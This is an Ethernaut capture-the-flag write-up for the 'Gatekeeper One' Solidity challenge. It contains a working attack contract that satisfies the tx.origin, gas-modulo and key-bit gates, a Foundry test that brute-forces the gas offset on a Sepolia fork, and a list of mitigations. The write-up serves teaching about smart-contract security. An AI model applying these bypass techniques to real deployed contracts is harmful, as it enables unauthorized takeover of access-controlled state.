# Ethernaut #13 — Gatekeeper One

## Objective

Become the `entrant` of the `GatekeeperOne` contract.

## Vulnerability: Bypassing Gas-Based Access Control

`GatekeeperOne.enter(bytes8 _gateKey)` is protected by three modifiers. To enter successfully, we need to pass all three:

1. `gateOne` requires `msg.sender != tx.origin`.
2. `gateTwo` requires `gasleft() % 8191 == 0`.
3. `gateThree` checks specific bit constraints on the supplied key and compares part of it with `tx.origin`.

The first gate requires an intermediary contract. The third gate requires constructing a key with the correct bit pattern. The second gate is the tricky one because `gasleft()` depends on how much gas has already been consumed when execution reaches the check.

## Root Cause

The contract relies on predictable caller information and a gas-dependent condition for access control. An attacker can deploy an intermediary contract, construct a key from their own EOA, and search for a gas offset that satisfies the modulo condition.

The interesting part is that the gas limit supplied to an external call is not the same as the gas remaining when the target executes `gasleft()`. The gas consumed along the way matters.

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function entrant() external view returns(address);
    function enter(bytes8) external returns(bool);
}

contract Attacker {
    function enter(address _target, uint256 gas) external {
        IGatekeeperOne target = IGatekeeperOne(_target);

        uint16 eoa16 = uint16(uint160(tx.origin));
        uint64 key = uint64(1 << 63) + uint64(eoa16);

        bytes8 bKey = bytes8(key);

        require(gas < 8191, "gas >= 8191");
        require(target.enter{gas: 8191*10 + gas}(bKey), "failed");
    }
}
```

The contract handles all three gates.

- **Gate One:** Calling the target through `Attacker` makes `msg.sender` the attacker contract, while `tx.origin` remains the originating EOA.
- **Gate Three:** `eoa16` extracts the lower 16 bits of `tx.origin`. Setting bit 63 makes the upper 32 bits nonzero, while the lower 32 bits remain equal to the lower 16 bits.
- **Gate Two:** The function accepts a configurable gas offset and forwards `8191 * 10 + gas` to the target. The offset lets us adjust the forwarded gas until the modulo check succeeds.

## Finding the Gas Offset

I initially had to understand how `gasleft()` worked before I could reliably pass Gate Two. Rather than repeatedly trying values in live transactions, I used Foundry against a Sepolia fork to search for a successful offset.

My test:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../src/Attacker.sol";

contract AttackerTest is Test {
    GatekeeperOne private target;

    Attacker private attacker;

    function setUp() public {
        target = GatekeeperOne(0xCA34BA9Fbe987bC23Be1d56b2bc227Dde1F80b68);
        attacker = new Attacker();
    }

    function test() public {
        for(uint i=0; i<8191; i++){
            try attacker.enter(address(target), i){
                console.log("gas", i);
                return;
            }catch{}
        }
        revert("all failed");
    }
}
```

The test tries offsets from `0` through `8190`. Each attempt calls the attacker contract with a different offset. If the call fails, `catch` allows the loop to continue. When an attempt succeeds, the test logs the working offset and returns.

The important distinction is that the logged value is the **offset**, not the total gas forwarded to `GatekeeperOne`.

The requested gas is:

`8191 * 10 + offset`

I used `8191 * 10` as a baseline and searched for the additional gas needed to make `gasleft()` divisible by `8191` at the point where Gate Two executes.

The successful fork test changed only simulated state. It helped identify a working configuration without broadcasting thousands of failed attempts to Sepolia.

## Exploit

1. Read the target contract and identify the three gate conditions.
2. Write the `Attacker` contract to satisfy the caller-identity requirement and construct a valid key.
3. Use a Foundry test against a Sepolia fork to search for the gas offset.
4. Use the successful offset when calling the deployed attack contract on Sepolia.
5. Verify the target's `entrant()` value to confirm the attack succeeded.

The final verification returned:

```text
0x0C6c78a0aee50184b3eF605225a1c605A48e6144
```

This matched my originating EOA, confirming that the actual Sepolia contract state had been updated successfully.

**On `gasleft()`.** `gasleft()` returns the gas remaining at the point of execution. It is affected by gas already consumed, external-call overhead, and EVM gas-forwarding rules. The successful gas-used figure in a trace is not the gas limit we need to forward. We need the requested gas configuration that makes the remaining gas divisible by `8191` when the check executes.

## Impact

An attacker can bypass the gate conditions and set `entrant` to their own address by constructing a valid key and finding a gas configuration that passes the modulo check. The restrictions do not prevent entry; they make the attack dependent on understanding the EVM's execution and gas accounting.

## Key Takeaways

- `msg.sender` is the immediate caller, while `tx.origin` is the originating EOA. An intermediary contract makes these values different.
- Bitwise operations can construct a key that satisfies multiple constraints simultaneously.
- `gasleft()` measures remaining gas at the point of execution, not the initial gas limit.
- The gas requested for an external call is not necessarily the gas available when the target reaches a particular instruction.
- Foundry fork testing can automate gas searches without broadcasting every failed attempt to a live network.
- A successful fork test only changes simulated state. Always verify the result against the actual deployed contract.

## Mitigation

- Avoid using `tx.origin` as an authorization mechanism. Use explicit authorization checks instead.
- Do not rely on gas-sensitive conditions as a security boundary. Gas availability can vary with the caller and execution path.
- Do not treat values derived from public information, such as an EOA address, as secrets.
- Base access control on the actual authorization requirement rather than gas constraints that can be satisfied through experimentation.
